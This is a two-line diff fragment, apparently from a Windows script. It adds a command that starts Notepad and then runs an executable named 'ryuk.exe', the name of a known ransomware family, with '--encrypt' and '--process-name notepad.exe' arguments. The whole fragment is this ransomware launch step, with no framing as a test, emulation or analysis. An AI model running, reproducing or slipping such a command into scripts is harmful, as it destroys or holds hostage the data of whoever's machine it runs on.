@@ -1,0 +1,2 @@
+Start-Process C:\Windows\System32\notepad.exe;
+cmd /c "C:\Users\Public\ryuk.exe --encrypt --process-name notepad.exe";
